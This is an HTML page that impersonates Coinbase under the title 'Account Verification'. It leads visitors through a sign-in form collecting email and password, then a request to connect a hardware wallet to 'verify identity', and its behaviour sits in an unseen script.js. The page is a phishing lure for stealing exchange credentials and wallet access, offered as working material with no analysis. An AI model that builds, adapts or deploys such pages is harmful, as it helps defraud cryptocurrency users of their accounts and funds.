<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase | Account Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body style="margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background-color:#f4f7fa;">
    <div class="auth-card" id="step-1">
        <img src="logo.png" class="cb-logo">
        <h1 class="cb-title">coinbase</h1>
        <p>Secure your assets with the world's most trusted crypto platform.</p>
        <button id="toStep2" class="btn-primary">Get started</button>
    </div>

    <div class="auth-card hidden" id="step-2">
        <img src="logo.png" class="cb-logo">
        <h1 class="cb-header">Sign In</h1>
        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="email" placeholder="name@email.com">
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Enter password">
        </div>
        <button id="toStep3" class="btn-primary">Continue</button>
    </div>

    <div class="auth-card hidden" id="step-3">
        <img src="logo.png" class="cb-logo">
        <h1 id="step3Title" class="cb-header">Connect Wallet</h1>
        <p id="step3Desc">Please connect your hardware wallet to verify your identity.</p>
        <button id="connectBtn" class="btn-primary">Connect Wallet</button>
        <div id="status" class="status-text"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
